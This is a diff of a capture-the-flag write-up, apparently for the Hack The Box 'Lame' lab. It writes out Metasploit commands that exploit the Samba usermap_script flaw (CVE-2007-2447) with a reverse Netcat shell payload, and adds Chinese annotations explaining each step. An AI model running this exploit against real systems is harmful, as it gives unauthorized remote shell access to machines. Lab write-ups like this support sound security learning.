@@ -79,16 +79,24 @@ Submit the flag located in the makis user's home directory.
 ![image](https://github.com/user-attachments/assets/3abc2f22-f81f-4749-bc2c-1e97e0a56036)
 
 
-bash msfconsole use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3 set PAYLOAD cmd/unix/reverse_netcat set LHOST 10.10.14.71 run 
+
 
 <pre> ```
-  msfconsole
+msfconsole
 use exploit/multi/samba/usermap_script
 set RHOSTS 10.10.10.3
 set PAYLOAD cmd/unix/reverse_netcat
-set LHOST 10.10.14.71
+set LHOST <IP>
 run
   ``` </pre>
+
+  啟動 Metasploit 主控台工具，用來執行滲透模組。
+  選擇針對 CVE-2007-2447 的 Samba 利用模組。
+  RHOSTS：遠端目標主機 IP。
+  使用最簡單的 Linux shell payload：反向連線給你一個 Netcat shell。
+  LHOST 是你的 Kali 機器的 VPN IP，讓靶機知道要連回哪裡。
+  設定你開啟 Netcat 來接收 shell 的 port。
+  送出 exploit，嘗試利用漏洞。
 
 
 
